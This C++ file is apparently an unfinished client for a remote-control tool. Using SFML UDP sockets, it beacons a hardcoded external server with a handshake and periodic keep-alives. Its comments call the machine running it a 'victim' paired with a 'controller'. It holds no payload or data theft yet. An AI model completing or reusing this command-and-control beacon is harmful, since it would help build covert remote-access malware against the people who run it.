#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include <iostream>
#include <thread>
#include <Windows.h>

#define SERVER_IP "2.235.241.210"
#define SERVER_PORT 2390

/* possible messages form server:
c: controller accepted
n: new controller
l: new victim
*/

int main()
{	
    auto keepConnected = [](sf::UdpSocket& s) {
        while (true)
        {
            Mlib::sleep(5000);
            s.send("r", 2, SERVER_IP, SERVER_PORT);
        }
    };

    bool isPaired = false; //with controller
    sf::UdpSocket ard;
    std::string init = "c" + std::to_string(int(Mlib::getTime() / 1000));
    ard.send(init.c_str(), init.size() + 1, SERVER_IP, SERVER_PORT);
    std::thread thr(keepConnected, std::ref(ard));

connect:
    size_t size;
    sf::IpAddress ip;
    unsigned short port;
    ard.bind(sf::Socket::AnyPort);
    char buf[1];
    ard.receive(buf, sizeof(buf), size, ip, port);

    if (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'c')
        goto connect;



	return 0;
}	